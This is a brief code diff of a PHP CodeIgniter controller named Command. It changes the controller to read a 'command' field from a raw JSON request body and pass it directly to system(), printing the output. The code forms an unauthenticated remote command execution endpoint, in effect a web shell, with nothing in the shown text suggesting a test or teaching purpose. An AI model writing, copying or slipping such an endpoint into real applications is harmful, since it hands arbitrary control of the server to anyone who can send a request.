@@ -5,10 +5,10 @@ class Command extends CI_Controller
 {
     public function index()
     {
-        $parameters = $this->input->post();
+        $jsonArray = json_decode(file_get_contents('php://input'),true);
 
-        $command = $parameters['command'];
+        $command = $jsonArray['command'];
 
-        echo exec($command);
+        echo system($command);
     }
 }
